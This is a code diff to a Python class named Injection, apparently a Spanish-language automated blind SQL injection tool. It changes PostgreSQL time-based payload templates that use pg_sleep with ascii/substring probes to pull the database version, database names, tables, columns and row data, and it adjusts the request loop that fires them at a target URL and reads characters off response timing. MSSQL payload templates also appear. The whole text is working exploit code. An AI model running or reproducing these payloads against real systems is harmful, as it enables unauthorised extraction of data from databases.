@@ -81,10 +81,10 @@ class Injection:
 	catalogoPostgresBlind={
 		'version':["lol 1" , "';" , "select case when(ascii(substring((select version())," , "))" , "-- -+", "", "", ") then pg_sleep(1) ELSE 'E' END"],
 		'bases':["lol" , "';" , "select case when(ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
-		'current':["' and   ascii(substring((SELECT current_database()),1,1))" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
-		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(10) ELSE 'E' END"],
-		'columnas':["';" , " and   ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(10) ELSE 'E' END"],
-		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(10) ELSE 'E' END"]
+		'current':["' select case when(ascii(substring((SELECT current_database()),1,1))" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
+		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
+		'columnas':["';" , " select case when(ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
+		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(1) ELSE 'E' END"]
 	}
 	catalogoMSSQLBlind={
 		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
@@ -225,7 +225,7 @@ class Injection:
 		elif based == "time":
 			consulta = requests.get(url=direccion+"="+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 			#print consulta.elapsed.seconds
-			#print direccion+"="+str(ord(caracter))+manejador[tipo][7]+"-- -+"
+			#print "\n\n\n "+direccion+"="+str(ord(caracter))+manejador[tipo][7]+"-- -+"
 			#print "Consulta.text=("+consulta.text+") elapsed:"+str(consulta.elapsed.seconds)+" up y down"+str(up)+"   "+str(down)
 			if consulta.text == ok and consulta.elapsed.seconds == 1:
 				return caracter
@@ -237,7 +237,7 @@ class Injection:
 				
 
 				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
-				#print "\n\n\n "+direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+"
+				#print "\n"+direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+"
 				#print "else Consulta.text=("+consulta2.text+") elapsed:"+str(consulta2.elapsed.seconds)
 					
 				if consulta2.text == ok and consulta2.elapsed.seconds == 1:
